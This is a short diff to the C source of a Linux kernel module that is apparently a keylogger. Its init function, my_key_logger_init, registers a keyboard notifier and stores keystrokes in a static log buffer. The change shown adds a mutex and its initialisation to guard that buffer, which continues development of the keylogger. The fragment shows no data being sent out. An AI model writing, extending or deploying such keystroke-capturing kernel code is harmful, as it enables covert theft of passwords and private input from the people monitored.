@@ -29,6 +29,9 @@ static char log[LOG_MAX] = {0};
 static char *log_p = log;
 static int log_size;
 
+// mutex
+static DEFINE_MUTEX(mkl_mutex);
+
 // definition
 static int dev_open(struct inode *, struct file *);
 static int dev_release(struct inode *, struct file *);
@@ -84,6 +87,9 @@ static int __init my_key_logger_init(void){
   register_keyboard_notifier(&nb);
   memset(log, 0, LOG_MAX);
   printk(KERN_INFO "%s: registered keyboard_notifier", CLASS_NAME);
+
+  // mutex initialization
+  mutex_init(&mkl_mutex);
   
   return 0;
 }
